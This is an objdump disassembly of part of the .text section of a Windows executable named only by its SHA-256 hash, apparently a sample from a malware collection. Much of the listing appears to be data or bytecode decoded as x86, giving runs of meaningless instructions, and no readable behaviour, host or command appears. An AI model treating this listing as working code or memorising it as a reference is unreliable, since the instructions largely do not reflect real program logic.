
86c8b86a80e911bb63d7a78b828bf45a02afb5c9ab271906720feeec7c24fe7d.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	adc    BYTE PTR [eax+0x0],cl
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x277c00
  402013:	add    ah,cl
  402015:	pop    ds
  402016:	add    BYTE PTR [eax],al
  402018:	or     DWORD PTR [eax],eax
  40201a:	add    BYTE PTR [eax],al
  40201c:	adc    BYTE PTR [eax],al
  40201e:	add    BYTE PTR [esi],al
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax+0x0],al
	...
  40204d:	add    BYTE PTR [eax],al
  40204f:	add    BYTE PTR [eax],bl
  402051:	into   
  402052:	call   0x20acaa83
  402057:	xor    eax,0xf3f3e105
  40205c:	out    dx,al
  40205d:	inc    ecx
  40205e:	dec    esp
  40205f:	xchg   esp,eax
  402060:	gs lock ds push ds
  402064:	ror    BYTE PTR [ebp+0x41de6c7f],1
  40206a:	fstp   TBYTE PTR [esp+0x2e8dcbe1]
  402071:	sbb    BYTE PTR [edx-0x2d5d18f0],ch
  402077:	adc    ebp,ecx
  402079:	rcl    BYTE PTR [eax+0x7c],0xe2
  40207d:	pushf  
  40207e:	ins    DWORD PTR es:[edi],dx
  40207f:	cmp    cl,BYTE PTR [edi+edi*2]
  402082:	mov    esp,0x8c435cf9
  402087:	shl    DWORD PTR [edx+ebx*8-0x16],1
  40208b:	test   BYTE PTR [ebp+0x369f0ec8],ah
  402091:	add    eax,0x4ef2c615
  402096:	add    eax,0x8f029479
  40209b:	scas   eax,DWORD PTR es:[edi]
  40209c:	jp     0x4020d5
  40209e:	pop    esp
  40209f:	fs mov ecx,0xe78fda2b
  4020a5:	dec    eax
  4020a6:	mov    ecx,0xd1020e9
  4020ab:	jmp    0xc1ab6674
  4020b0:	rcl    DWORD PTR [ebx],cl
  4020b2:	out    dx,eax
  4020b3:	mov    al,ds:0x57a343f7
  4020b8:	sbb    ecx,DWORD PTR [eax+0x6c]
  4020bb:	icebp  
  4020bc:	in     eax,0x9
  4020be:	xchg   ebx,eax
  4020bf:	push   ecx
  4020c0:	mov    cl,0x16
  4020c2:	mov    BYTE PTR [edx],dl
  4020c4:	out    0x1b,eax
  4020c6:	sbb    BYTE PTR [edx-0x38],ch
  4020c9:	pusha  
  4020ca:	cmp    eax,0x7288925f
  4020cf:	cwde   
  4020d0:	call   0xa00:0x172802
  4020d7:	add    al,BYTE PTR ds:0x27d
  4020dd:	add    al,0x2
  4020df:	jnp    0x4020e3
  4020e1:	add    BYTE PTR [eax],al
  4020e3:	add    al,0x6f
  4020e5:	add    al,0x0
  4020e7:	add    BYTE PTR [esi],al
  4020e9:	add    al,BYTE PTR [ebx]
  4020eb:	add    al,0x73
  4020ed:	sbb    BYTE PTR [eax],al
  4020ef:	add    BYTE PTR [edx],cl
  4020f1:	jge    0x4020f4
  4020f3:	add    BYTE PTR [eax],al
  4020f5:	add    al,0x2a
  4020f7:	xor    al,BYTE PTR [edx]
  4020f9:	jnp    0x4020fd
  4020fb:	add    BYTE PTR [eax],al
  4020fd:	add    al,0x6f
  4020ff:	add    eax,0x2a060000
  402104:	push   ds
  402105:	add    bh,BYTE PTR [ebx+0x1]
  402108:	add    BYTE PTR [eax],al
  40210a:	add    al,0x2a
  40210c:	add    bh,BYTE PTR ss:[ebx+eax*1+0x0]
  402111:	add    BYTE PTR [eax+ebp*1],al
  402114:	sbb    DWORD PTR [eax],eax
  402116:	add    BYTE PTR [edx],cl
  402118:	sub    dh,BYTE PTR es:[esi]
  40211b:	add    bh,BYTE PTR [ebx+eax*1+0x0]
  40211f:	add    BYTE PTR [eax+ebp*1],al
  402122:	sbb    al,BYTE PTR [eax]
  402124:	add    BYTE PTR [edx],cl
  402126:	sub    dl,BYTE PTR es:[esi+0x2b]
  40212a:	or     ah,BYTE PTR [eax]
  40212c:	cli    
  40212d:	add    BYTE PTR [eax],al
  40212f:	add    BYTE PTR [eax],ch
  402131:	sbb    eax,DWORD PTR [eax]
  402133:	add    BYTE PTR [edx],cl
  402135:	add    bh,BYTE PTR [ebx+0x3]
  402138:	add    BYTE PTR [eax],al
  40213a:	add    al,0x2d
  40213c:	out    dx,al
  40213d:	sub    bl,BYTE PTR [esi]
  40213f:	add    ch,BYTE PTR [eax]
  402141:	pop    ss
  402142:	add    BYTE PTR [eax],al
  402144:	or     ch,BYTE PTR [edx]
  402146:	add    bh,BYTE PTR cs:[ebx+0x5]
  40214a:	add    BYTE PTR [eax],al
  40214c:	add    al,0x1f
  40214e:	or     bh,dh
  402150:	add    ch,BYTE PTR [edx]
  402152:	add    BYTE PTR [eax],al
  402154:	adc    esi,DWORD PTR [eax]
  402156:	push   es
  402157:	add    BYTE PTR [ebx],dl
  402159:	add    BYTE PTR [eax],al
  40215b:	add    BYTE PTR [ecx],al
  40215d:	add    BYTE PTR [eax],al
  40215f:	adc    DWORD PTR [ebx+0x1c],esi
  402162:	add    BYTE PTR [eax],al
  402164:	or     cl,BYTE PTR [edx]
  402166:	push   es
  402167:	add    al,0x3
  402169:	adc    al,0x14
  40216b:	add    eax,0x1d6f
  402170:	or     al,BYTE PTR [esi]
  402172:	sub    al,BYTE PTR [eax]
  402174:	sbb    esi,DWORD PTR [eax]
  402176:	add    al,0x0
  402178:	dec    edx
  402179:	add    DWORD PTR [eax],eax
  40217b:	add    BYTE PTR [edx],al
  40217d:	add    BYTE PTR [eax],al
  40217f:	adc    DWORD PTR [esi],ecx
  402181:	add    al,0x28
  402183:	push   ds
  402184:	add    BYTE PTR [eax],al
  402186:	or     dl,BYTE PTR [edx]
  402188:	add    BYTE PTR [edx],dl
  40218a:	add    DWORD PTR [eax],ebp
  40218c:	pop    ds
  40218d:	add    BYTE PTR [eax],al
  40218f:	or     al,BYTE PTR [esi]
  402191:	pop    ss
  402192:	pop    eax
  402193:	sbb    BYTE PTR [ebx+0xa],bl
  402196:	sbb    BYTE PTR [eax],ch
  402198:	and    BYTE PTR [eax],al
  40219a:	add    BYTE PTR [edx],cl
  40219c:	sub    al,0x21
  40219e:	add    al,BYTE PTR [ebx]
  4021a0:	add    al,0xe
  4021a2:	push   es
  4021a3:	sub    BYTE PTR [ecx],cl
  4021a5:	add    BYTE PTR [eax],al
  4021a7:	push   es
  4021a8:	or     al,0x8
  4021aa:	sub    BYTE PTR [ecx],ah
  4021ac:	add    BYTE PTR [eax],al
  4021ae:	or     cl,BYTE PTR [eax]
  4021b0:	outs   dx,DWORD PTR ds:[esi]
  4021b1:	and    al,BYTE PTR [eax]
  4021b3:	add    BYTE PTR [edx],cl
  4021b5:	outs   dx,DWORD PTR ds:[esi]
  4021b6:	and    eax,DWORD PTR [eax]
  4021b8:	add    BYTE PTR [edx],cl
  4021ba:	fiadd  WORD PTR [ebx]
  4021bc:	fiadd  WORD PTR es:[eax]
  4021bf:	adc    al,0xd
  4021c1:	adc    al,0x13
  4021c3:	add    al,0x12
  4021c5:	add    eax,0x28051616
  4021ca:	and    al,0x0
  4021cc:	add    BYTE PTR [edx],cl
  4021ce:	sub    BYTE PTR ds:0x130a0000,ah
  4021d4:	push   es
  4021d5:	jae    0x4021de
  4021d7:	add    BYTE PTR [eax],al
  4021d9:	push   es
  4021da:	adc    eax,DWORD PTR [edi]
  4021dc:	adc    al,0x13
  4021de:	or     DWORD PTR [edx],edx
  4021e0:	or     BYTE PTR [edx],dl
  4021e2:	add    DWORD PTR [eax],ebp
  4021e4:	pop    ds
  4021e5:	add    BYTE PTR [eax],al
  4021e7:	or     dl,BYTE PTR [ecx]
  4021e9:	or     BYTE PTR [esi],al
  4021eb:	xor    BYTE PTR [eax+eiz*1],cl
  4021ee:	hlt    
  4021ef:	add    DWORD PTR [eax],eax
  4021f1:	add    BYTE PTR [eax],ch
  4021f3:	sbb    eax,DWORD PTR [eax]
  4021f5:	add    BYTE PTR [edx],cl
  4021f7:	sub    esp,ebx
  4021f9:	add    al,BYTE PTR [ebx]
  4021fb:	add    al,0xe
  4021fd:	push   es
  4021fe:	sub    BYTE PTR [ecx],cl
  402200:	add    BYTE PTR [eax],al
  402202:	push   es
  402203:	adc    ecx,DWORD PTR [ecx]
  402205:	add    dl,BYTE PTR [ecx]
  402207:	or     DWORD PTR ds:0xb28,eax
  40220d:	push   es
  40220e:	or     eax,0x11312d09
  402213:	or     DWORD PTR [edi+0x22],ebp
  402216:	add    BYTE PTR [eax],al
  402218:	or     ch,BYTE PTR [edi+0x23]
  40221b:	add    BYTE PTR [eax],al
  40221d:	or     al,BYTE PTR [edx]
  40221f:	sub    BYTE PTR [eax],cl
  402221:	add    BYTE PTR [eax],al
  402223:	push   es
  402224:	sub    al,0x2
  402226:	fisubr WORD PTR [esi+0x28]
  402229:	and    eax,0x110a0000
  40222e:	push   es
  40222f:	sub    BYTE PTR [esi],ah
  402231:	add    BYTE PTR [eax],al
  402233:	or     dl,BYTE PTR [ebx]
  402235:	or     dl,BYTE PTR [ecx]
  402237:	or     dl,BYTE PTR [ecx]
  402239:	add    eax,0x2728
  40223e:	or     ch,BYTE PTR [edx+esi*1]
  402241:	ficom  WORD PTR [ebx+0x28]
  402244:	and    eax,0x130a0000
  402249:	push   es
  40224a:	adc    DWORD PTR [ecx],ecx
  40224c:	push   cs
  40224d:	add    eax,0x286f
  402252:	or     dl,BYTE PTR [ecx]
  402254:	or     DWORD PTR [ecx],ecx
  402256:	adc    DWORD PTR [edi],eax
  402258:	jae    0x40225b
  40225a:	add    BYTE PTR [eax],al
  40225c:	push   es
  40225d:	adc    eax,DWORD PTR [esp+edx*1]
  402260:	inc    BYTE PTR [esi]
  402262:	push   cs
  402263:	add    BYTE PTR [eax],al
  402265:	push   es
  402266:	jae    0x402291
  402268:	add    BYTE PTR [eax],al
  40226a:	or     dl,BYTE PTR [ecx]
  40226c:	add    al,0x28
  40226e:	sub    al,BYTE PTR [eax]
  402270:	add    BYTE PTR [edx],cl
  402272:	frstor es:[edi+edi*8-0x1]
  402277:	call   DWORD PTR [ebx]
  402279:	or     edx,DWORD PTR [ecx]
  40227b:	or     DWORD PTR [ecx],edx
  40227d:	or     ebx,DWORD PTR [ecx]
  40227f:	sub    BYTE PTR [ebx],ch
  402281:	add    BYTE PTR [eax],al
  402283:	or     dl,BYTE PTR [ecx]
  402285:	or     DWORD PTR [esp+ecx*1],ebp
  402288:	adc    DWORD PTR [ecx],ecx
  40228a:	outs   dx,DWORD PTR ds:[esi]
  40228b:	and    al,BYTE PTR [eax]
  40228d:	add    BYTE PTR [edx],cl
  40228f:	outs   dx,DWORD PTR ds:[esi]
  402290:	and    eax,DWORD PTR [eax]
  402292:	add    BYTE PTR [edx],cl
  402294:	fiadd  WORD PTR [eax]
  402296:	adc    DWORD PTR [edi],eax
  402298:	outs   dx,DWORD PTR ds:[esi]
  402299:	push   es
  40229a:	add    BYTE PTR [eax],al
  40229c:	push   es
  40229d:	sbb    BYTE PTR [eax],ch
  40229f:	and    BYTE PTR [eax],al
  4022a1:	add    BYTE PTR [edx],cl
  4022a3:	sub    al,0x24
  4022a5:	add    al,BYTE PTR [ebx]
  4022a7:	add    al,0xe
  4022a9:	push   es
  4022aa:	sub    BYTE PTR [ecx],cl
  4022ac:	add    BYTE PTR [eax],al
  4022ae:	push   es
  4022af:	adc    ecx,DWORD PTR [ecx+edx*1]
  4022b2:	or     al,0x28
  4022b4:	sub    al,0x0
  4022b6:	add    BYTE PTR [edx],cl
  4022b8:	adc    DWORD PTR [edi+ebp*2],ecx
  4022bb:	and    al,BYTE PTR [eax]
  4022bd:	add    BYTE PTR [edx],cl
  4022bf:	outs   dx,DWORD PTR ds:[esi]
  4022c0:	and    eax,DWORD PTR [eax]
  4022c2:	add    BYTE PTR [edx],cl
  4022c4:	fiadd  WORD PTR [ebx]
  4022c6:	fiadd  WORD PTR es:[eax]
  4022c9:	sub    al,BYTE PTR [eax]
  4022cb:	add    BYTE PTR [ecx],al
  4022cd:	sub    BYTE PTR [eax],al
  4022cf:	add    BYTE PTR [eax],al
  4022d1:	add    BYTE PTR [esi],bl
  4022d3:	add    BYTE PTR [esi],bl
  4022d5:	cmp    al,0x0
  4022d7:	add    eax,DWORD PTR [ecx]
  4022d9:	add    BYTE PTR [eax],al
  4022db:	add    DWORD PTR [eax],eax
  4022dd:	add    BYTE PTR [ecx+0x0],bh
  4022e0:	jg     0x4022da
  4022e2:	add    BYTE PTR [esi],bl
  4022e4:	daa    
  4022e5:	add    BYTE PTR [eax],al
  4022e7:	add    DWORD PTR [eax],eax
  4022e9:	add    BYTE PTR ds:0x1462101,ah
  4022ef:	add    eax,DWORD PTR [ecx]
  4022f1:	add    BYTE PTR [eax],al
  4022f3:	add    DWORD PTR [ebx],ebx
  4022f5:	xor    BYTE PTR [ebx],al
  4022f7:	add    al,ch
  4022f9:	add    BYTE PTR [eax],al
  4022fb:	add    BYTE PTR [ebx],al
  4022fd:	add    BYTE PTR [eax],al
  4022ff:	adc    DWORD PTR [ebx],eax
  402301:	outs   dx,DWORD PTR ds:[esi]
  402302:	and    al,BYTE PTR [eax]
  402304:	add    BYTE PTR [edx],cl
  402306:	outs   dx,DWORD PTR ds:[esi]
  402307:	sub    eax,0x30a0000
  40230c:	add    al,0x6f
  40230e:	add    BYTE PTR cs:[eax],al
  402311:	or     cl,BYTE PTR [edx]
  402313:	add    bh,BYTE PTR [ebx+0x5]
  402316:	add    BYTE PTR [eax],al
  402318:	add    al,0x16
  40231a:	xor    DWORD PTR [esi],ecx
  40231c:	add    ah,BYTE PTR ds:0x57b
  402322:	add    al,0x17
  402324:	pop    ecx
  402325:	jge    0x40232c
  402327:	add    BYTE PTR [eax],al
  402329:	add    al,0x6
  40232b:	adc    eax,DWORD PTR [ebx*8+0xb3]
  402332:	add    ebp,DWORD PTR es:[edi+0x22]
  402336:	add    BYTE PTR [eax],al
  402338:	or     ch,BYTE PTR [edi+0x2f]
  40233b:	add    BYTE PTR [eax],al
  40233d:	or     bl,dh
  40233f:	shl    BYTE PTR [esi],0x3
  402342:	outs   dx,DWORD PTR ds:[esi]
  402343:	and    al,BYTE PTR [eax]
  402345:	add    BYTE PTR [edx],cl
  402347:	outs   dx,DWORD PTR ds:[esi]
  402348:	das    
  402349:	add    BYTE PTR [eax],al
  40234b:	or     bl,dh
  40234d:	mov    dl,0xb
  40234f:	add    ebp,DWORD PTR [edi+0x22]
  402352:	add    BYTE PTR [eax],al
  402354:	or     ch,BYTE PTR [edi+0x30]
  402357:	add    BYTE PTR [eax],al
  402359:	or     al,BYTE PTR [edi]
  40235b:	jnp    0x40238e
  40235d:	add    BYTE PTR [eax],al
  40235f:	or     bh,BYTE PTR [esi+0x32]
  402362:	add    BYTE PTR [eax],al
  402364:	or     dh,BYTE PTR [ebx]
  402366:	or     BYTE PTR [ebx],al
  402368:	pop    es
  402369:	pop    ss
  40236a:	sub    BYTE PTR [ebx],ch
  40236c:	add    BYTE PTR [eax],al
  40236e:	or     al,BYTE PTR [edx]
  402370:	pop    ds
  402371:	or     edi,DWORD PTR [ebp+0x5]
  402374:	add    BYTE PTR [eax],al
  402376:	add    al,0x14
  402378:	adc    eax,DWORD PTR [esi+ebx*8]
  40237b:	imul   ecx,DWORD PTR [ebx+eax*1],0x226f
  402382:	or     ch,BYTE PTR [edi+0x2f]
  402385:	add    BYTE PTR [eax],al
  402387:	or     cl,BYTE PTR [eax]
  402389:	jp     0x402398
  40238b:	add    ah,BYTE PTR ds:0x57b
  402391:	add    al,0x17
  402393:	pop    eax
  402394:	jge    0x40239b
  402396:	add    BYTE PTR [eax],al
  402398:	add    al,0x2
  40239a:	sub    BYTE PTR [eax],cl
  40239c:	add    BYTE PTR [eax],al
  40239e:	push   es
  40239f:	sub    al,0x15
  4023a1:	add    ebp,DWORD PTR [edi+0x22]
  4023a4:	add    BYTE PTR [eax],al
  4023a6:	or     ch,BYTE PTR [edi+0x2f]
  4023a9:	add    BYTE PTR [eax],al
  4023ab:	or     al,BYTE PTR [ebx]
  4023ad:	or     DWORD PTR [ecx],ebx
  4023af:	sub    BYTE PTR [ebx],ch
  4023b1:	add    BYTE PTR [eax],al
  4023b3:	or     ch,BYTE PTR [ebx]
  4023b5:	sub    al,BYTE PTR [ebx]
  4023b7:	outs   dx,DWORD PTR ds:[esi]
  4023b8:	and    al,BYTE PTR [eax]
  4023ba:	add    BYTE PTR [edx],cl
  4023bc:	outs   dx,DWORD PTR ds:[esi]
  4023bd:	xor    BYTE PTR [eax],al
  4023bf:	add    BYTE PTR [edx],cl
  4023c1:	add    ecx,DWORD PTR [ecx]
  4023c3:	sbb    BYTE PTR [eax],ch
  4023c5:	sub    eax,DWORD PTR [eax]
  4023c7:	add    BYTE PTR [edx],cl
  4023c9:	and    ah,dh
  4023cb:	add    DWORD PTR [eax],eax
  4023cd:	add    BYTE PTR [edx],al
  4023cf:	jnp    0x4023d6
  4023d1:	add    BYTE PTR [eax],al
  4023d3:	add    al,0x5a
  4023d5:	and    al,ch
  4023d7:	add    eax,DWORD PTR [eax]
  4023d9:	add    BYTE PTR [eax+0x28],bl
  4023dc:	sbb    eax,DWORD PTR [eax]
  4023de:	add    BYTE PTR [edx],cl
  4023e0:	adc    al,0x13
  4023e2:	add    al,0xde
  4023e4:	add    BYTE PTR [ecx],dl
  4023e6:	add    al,0x2a
  4023e8:	add    DWORD PTR [eax+0x0],eax
  4023eb:	add    BYTE PTR [eax],al
  4023ed:	add    BYTE PTR [eax],al
  4023ef:	add    BYTE PTR [edx],dh
  4023f1:	xor    al,BYTE PTR [eax]
  4023f3:	push   cs
  4023f4:	sub    al,0x0
  4023f6:	add    BYTE PTR [ecx],al
  4023f8:	add    BYTE PTR [eax],al
  4023fa:	add    BYTE PTR [eax],al
  4023fc:	xor    al,BYTE PTR [eax+0x0]
  4023ff:	push   cs
  402400:	sub    eax,0x10000
  402405:	add    BYTE PTR [eax],al
  402407:	add    BYTE PTR [edx],dh
  402409:	dec    esi
  40240a:	add    BYTE PTR [esi],ch
  40240c:	sub    DWORD PTR [eax],eax
  40240e:	add    BYTE PTR [ecx],al
  402410:	add    BYTE PTR [eax],al
  402412:	add    BYTE PTR [eax],al
  402414:	xor    bh,BYTE PTR [eax+eax*1+0xe]
  402418:	sub    eax,DWORD PTR [eax]
  40241a:	add    BYTE PTR [ecx],al
  40241c:	add    BYTE PTR [eax],al
  40241e:	add    BYTE PTR [eax],al
  402420:	xor    cl,BYTE PTR [edx+0x275b00]
  402426:	add    BYTE PTR [ecx],al
  402428:	push   ds
  402429:	add    ch,BYTE PTR [eax]
  40242b:	pop    ss
  40242c:	add    BYTE PTR [eax],al
  40242e:	or     ch,BYTE PTR [edx]
  402430:	add    esi,DWORD PTR [eax]
  402432:	add    eax,DWORD PTR [eax]
  402434:	pop    ebx
  402435:	add    BYTE PTR [eax],al
  402437:	add    BYTE PTR [eax],al
  402439:	add    BYTE PTR [eax],al
  40243b:	add    BYTE PTR [edx],al
  40243d:	outs   dx,DWORD PTR ds:[esi]
  40243e:	add    eax,DWORD PTR [eax]
  402440:	add    BYTE PTR [esi],al
  402442:	outs   dx,DWORD PTR ds:[esi]
  402443:	xor    eax,DWORD PTR [eax]
  402445:	add    BYTE PTR [edx],cl
  402447:	outs   dx,DWORD PTR ds:[esi]
  402448:	xor    al,0x0
  40244a:	add    BYTE PTR [edx],cl
  40244c:	pop    ss
  40244d:	cs add ch,BYTE PTR es:[edi+0x3]
  402452:	add    BYTE PTR [eax],al
  402454:	push   es
  402455:	outs   dx,DWORD PTR ds:[esi]
  402456:	xor    eax,DWORD PTR [eax]
  402458:	add    BYTE PTR [edx],cl
  40245a:	outs   dx,DWORD PTR ds:[esi]
  40245b:	xor    al,0x0
  40245d:	add    BYTE PTR [edx],cl
  40245f:	sub    al,0x14
  402461:	add    ch,BYTE PTR [edi+0x3]
  402464:	add    BYTE PTR [eax],al
  402466:	push   es
  402467:	outs   dx,DWORD PTR ds:[esi]
  402468:	xor    eax,DWORD PTR [eax]
  40246a:	add    BYTE PTR [edx],cl
  40246c:	outs   dx,DWORD PTR ds:[esi]
  40246d:	xor    al,0x0
  40246f:	add    BYTE PTR [edx],cl
  402471:	sbb    DWORD PTR [esi],ebp
  402473:	add    DWORD PTR [edx],ebp
  402475:	add    ch,BYTE PTR [edi+0x3]
  402478:	add    BYTE PTR [eax],al
  40247a:	push   es
  40247b:	outs   dx,DWORD PTR ds:[esi]
  40247c:	xor    eax,0x30a0000
  402481:	add    ch,BYTE PTR [edi+0x3]
  402484:	add    BYTE PTR [eax],al
  402486:	push   es
  402487:	outs   dx,DWORD PTR ds:[esi]
  402488:	xor    eax,DWORD PTR [eax]
  40248a:	add    BYTE PTR [edx],cl
  40248c:	outs   dx,DWORD PTR ds:[esi]
  40248d:	add    BYTE PTR ss:[eax],al
  402490:	or     ch,BYTE PTR [edi+0x37]
  402493:	add    BYTE PTR [eax],al
  402495:	or     ch,BYTE PTR [edx]
  402497:	add    BYTE PTR [ebx],bl
  402499:	xor    BYTE PTR [ebx],al
  40249b:	add    ah,cl
  40249d:	add    BYTE PTR [eax],al
  40249f:	add    BYTE PTR [eax+eax*1],al
  4024a2:	add    BYTE PTR [ecx],dl
  4024a4:	adc    al,0xa
  4024a6:	jae    0x4024e0
  4024a8:	add    BYTE PTR [eax],al
  4024aa:	or     cl,BYTE PTR [ebx]
  4024ac:	add    dh,BYTE PTR [edx+eax*1+0x0]
  4024b0:	add    BYTE PTR [edx],al
  4024b2:	or     al,BYTE PTR [edi]
  4024b4:	push   es
  4024b5:	outs   dx,DWORD PTR ds:[esi]
  4024b6:	add    eax,DWORD PTR [eax]
  4024b8:	add    BYTE PTR [esi],al
  4024ba:	outs   dx,DWORD PTR ds:[esi]
  4024bb:	cmp    DWORD PTR [eax],eax
  4024bd:	add    BYTE PTR [edx],cl
  4024bf:	or     al,0x6
  4024c1:	or     BYTE PTR [eax],ch
  4024c3:	or     eax,0xde060000
  4024c8:	adc    eax,0x36f060d
  4024cd:	add    BYTE PTR [eax],al
  4024cf:	push   es
  4024d0:	outs   dx,DWORD PTR ds:[esi]
  4024d1:	xor    eax,0x90a0000
  4024d6:	sbb    DWORD PTR [eax],ebp
  4024d8:	sub    eax,DWORD PTR [eax]
  4024da:	add    BYTE PTR [edx],cl
  4024dc:	fiadd  WORD PTR [eax]
  4024de:	push   es
  4024df:	outs   dx,DWORD PTR ds:[esi]
  4024e0:	add    eax,DWORD PTR [eax]
  4024e2:	add    BYTE PTR [esi],al
  4024e4:	outs   dx,DWORD PTR ds:[esi]
  4024e5:	xor    eax,DWORD PTR [eax]
  4024e7:	add    BYTE PTR [edx],cl
  4024e9:	outs   dx,DWORD PTR ds:[esi]
  4024ea:	cmp    al,BYTE PTR [eax]
  4024ec:	add    BYTE PTR [edx],cl
  4024ee:	ficom  WORD PTR [edi]
  4024f0:	adc    eax,DWORD PTR [esi+eax*1]
  4024f3:	outs   dx,DWORD PTR ds:[esi]
  4024f4:	add    eax,DWORD PTR [eax]
  4024f6:	add    BYTE PTR [esi],al
  4024f8:	outs   dx,DWORD PTR ds:[esi]
  4024f9:	xor    eax,0x110a0000
  4024fe:	add    al,0x19
  402500:	sub    BYTE PTR [ebx],ch
  402502:	add    BYTE PTR [eax],al
  402504:	or     bl,dh
  402506:	add    BYTE PTR [esi],al
  402508:	outs   dx,DWORD PTR ds:[esi]
  402509:	add    eax,DWORD PTR [eax]
  40250b:	add    BYTE PTR [esi],al
  40250d:	outs   dx,DWORD PTR ds:[esi]
  40250e:	xor    eax,0x6f0a0000
  402513:	and    al,BYTE PTR [eax]
  402515:	add    BYTE PTR [edx],cl
  402517:	outs   dx,DWORD PTR ds:[esi]
  402518:	das    
  402519:	add    BYTE PTR [eax],al
  40251b:	or     bl,dh
  40251d:	pop    ss
  40251e:	adc    eax,DWORD PTR ds:0x36f06
  402524:	add    BYTE PTR [esi],al
  402526:	outs   dx,DWORD PTR ds:[esi]
  402527:	xor    eax,0x110a0000
  40252c:	add    eax,0x2b2819
  402531:	add    BYTE PTR [edx],cl
  402533:	fiadd  WORD PTR [eax]
  402535:	push   es
  402536:	outs   dx,DWORD PTR ds:[esi]
  402537:	add    eax,DWORD PTR [eax]
  402539:	add    BYTE PTR [esi],al
  40253b:	outs   dx,DWORD PTR ds:[esi]
  40253c:	xor    eax,0x6f0a0000
  402541:	and    al,BYTE PTR [eax]
  402543:	add    BYTE PTR [edx],cl
  402545:	outs   dx,DWORD PTR ds:[esi]
  402546:	and    eax,DWORD PTR [eax]
  402548:	add    BYTE PTR [edx],cl
  40254a:	ficom  WORD PTR [edi]
  40254c:	adc    eax,DWORD PTR [esi]
  40254e:	push   es
  40254f:	outs   dx,DWORD PTR ds:[esi]
  402550:	add    eax,DWORD PTR [eax]
  402552:	add    BYTE PTR [esi],al
  402554:	outs   dx,DWORD PTR ds:[esi]
  402555:	xor    eax,0x110a0000
  40255a:	push   es
  40255b:	sbb    DWORD PTR [eax],ebp
  40255d:	sub    eax,DWORD PTR [eax]
  40255f:	add    BYTE PTR [edx],cl
  402561:	fiadd  WORD PTR [eax]
  402563:	push   es
  402564:	outs   dx,DWORD PTR ds:[esi]
  402565:	add    al,BYTE PTR [eax]
  402567:	add    BYTE PTR [esi],al
  402569:	pop    es
  40256a:	outs   dx,DWORD PTR ds:[esi]
  40256b:	cmp    eax,DWORD PTR [eax]
  40256d:	add    BYTE PTR [edx],cl
  40256f:	sub    al,BYTE PTR [ecx]
  402571:	xor    al,0x0
  402573:	add    BYTE PTR [eax],al
  402575:	add    BYTE PTR [eax],cl
  402577:	add    BYTE PTR ds:0x27150025,bl
  40257d:	add    BYTE PTR [eax],al
  40257f:	add    DWORD PTR [eax],eax
  402581:	add    BYTE PTR [edx],bh
  402583:	add    BYTE PTR [edx],dl
  402585:	dec    esp
  402586:	add    BYTE PTR [edi],dl
  402588:	daa    
  402589:	add    BYTE PTR [eax],al
  40258b:	add    DWORD PTR [eax],eax
  40258d:	add    BYTE PTR [ebx+0x0],ah
  402590:	pop    ss
  402591:	jp     0x402593
  402593:	pop    ss
  402594:	daa    
  402595:	add    BYTE PTR [eax],al
  402597:	add    DWORD PTR [eax],eax
  402599:	add    BYTE PTR [ecx+0xa81700],dl
  40259f:	pop    ss
  4025a0:	daa    
  4025a1:	add    BYTE PTR [eax],al
  4025a3:	add    DWORD PTR [esi],ebx
  4025a5:	add    ch,BYTE PTR [eax]
  4025a7:	pop    ss
  4025a8:	add    BYTE PTR [eax],al
  4025aa:	or     ch,BYTE PTR [edx]
  4025ac:	sbb    esi,DWORD PTR [eax]
  4025ae:	pop    es
  4025af:	add    BYTE PTR [eax],ah
  4025b1:	add    DWORD PTR [eax],eax
  4025b3:	add    BYTE PTR ds:0x72110000,al
  4025b9:	add    DWORD PTR [eax],eax
  4025bb:	add    BYTE PTR [eax+0xa],dh
  4025be:	jb     0x4025cb
  4025c0:	add    BYTE PTR [eax],al
  4025c2:	jo     0x4025cf
  4025c4:	pop    ds
  4025c5:	cmp    al,0xc
  4025c7:	sbb    BYTE PTR ds:0x2041314,cl
  4025cd:	mov    gs,WORD PTR [ecx+0x17]
  4025d0:	aas    
  4025d1:	xlat   BYTE PTR ds:[ebx]
  4025d2:	add    BYTE PTR [eax],al
  4025d4:	add    BYTE PTR [edx],al
  4025d6:	push   ss
  4025d7:	call   0x170a:0x3c28
  4025de:	xor    eax,DWORD PTR [eax+ebp*1+0x3d]
  4025e2:	add    BYTE PTR [eax],al
  4025e4:	or     dh,BYTE PTR [edx+0xf]
  4025e7:	add    BYTE PTR [eax],al
  4025e9:	jo     0x40265a
  4025eb:	add    BYTE PTR ds:[eax],al
  4025ee:	or     ch,BYTE PTR [eax+edx*1]
  4025f1:	sub    BYTE PTR ds:0x720a0000,bh
  4025f7:	sldt   WORD PTR [eax]
  4025fa:	jo     0x40266b
  4025fc:	add    BYTE PTR ds:[eax],al
  4025ff:	or     cl,BYTE PTR [ebx]
  402601:	sub    BYTE PTR ds:0x720a0000,bh
  402607:	xor    eax,0x6f700000
  40260c:	add    BYTE PTR ds:[eax],al
  40260f:	or     ch,BYTE PTR [eax+eiz*1]
  402612:	sub    BYTE PTR ds:0x720a0000,bh
  402618:	xor    eax,0x6f700000
  40261d:	add    BYTE PTR ds:[eax],al
  402620:	or     cl,BYTE PTR [edx]
  402622:	sub    ecx,DWORD PTR [esi]
  402624:	add    cl,BYTE PTR [esi+0x8321969]
  40262a:	add    dl,BYTE PTR [edi]
  40262c:	call   0x20b:0x9a18020a
  402633:	mov    gs,WORD PTR [ecx+0x1a]
  402636:	xor    dl,BYTE PTR [edx]
  402638:	add    bl,BYTE PTR [ecx]
  40263a:	call   0xc0a:0x3c28
  402641:	or     BYTE PTR [esi],dl
  402643:	xor    al,BYTE PTR [ebx]
  402645:	or     BYTE PTR [ebx],ch
  402647:	add    DWORD PTR [esi],edx
  402649:	or     al,0x2
  40264b:	mov    gs,WORD PTR [ecx+0x1b]
  40264e:	xor    cl,BYTE PTR [edx+eax*1+0x1a]
  402652:	call   0x100:0x58c17
  402659:	outs   dx,DWORD PTR ds:[esi]
  40265a:	aas    
  40265b:	add    BYTE PTR [eax],al
  40265d:	or     bl,BYTE PTR [ebx]
  40265f:	sub    BYTE PTR [eax+0x0],al
  402662:	add    BYTE PTR [edx],cl
  402664:	sub    eax,0x2b0d1704
  402669:	xor    al,BYTE PTR [edx]
  40266b:	sbb    bl,BYTE PTR [edx+0x58c18]
  402671:	add    BYTE PTR [ecx],al
